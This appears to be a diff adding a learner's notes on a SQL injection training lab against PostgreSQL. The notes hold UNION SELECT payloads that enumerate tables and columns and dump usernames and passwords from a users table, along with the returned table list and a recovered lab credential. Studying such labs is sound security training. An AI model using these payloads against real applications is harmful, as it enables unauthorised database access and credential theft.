@@ -268,4 +268,33 @@ solution;
     PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
     - we know this is postgresql + contain a table but we didn't know it's name but it's contents are password,username
       ' UNION SELECT table_name,NULL FROM information_schema.tables--
+then we found name of the table at the  end of  it
+'+Union select column_name,null from information_schema.columns where table_name='users_qthbul'
+then ;
+'+Union select username_burnmr,password_kocrqi from  users_qthbul --
+user_defined_types
+pg_statio_user_sequences
+pg_user_mappings
+pg_stat_xact_user_functions
+user_mappings
+pg_stat_user_tables
+user_mapping_options
+pg_stat_xact_user_tables
+pg_statio_user_tables
+pg_user
+users_qthbul
+ now 
+ we want the columns(username,password) from users_qthbul
+ columns we got;
+ password_kocrqi
+ username_burnmr
+ email
+ Portable Hat
+ 
+ this is the username;wiener
+ this is the password;zu7mwvsfotbnin10qlpm
+stoped here;Listing the contents of an Oracle database lab;
 
+
+
+ 
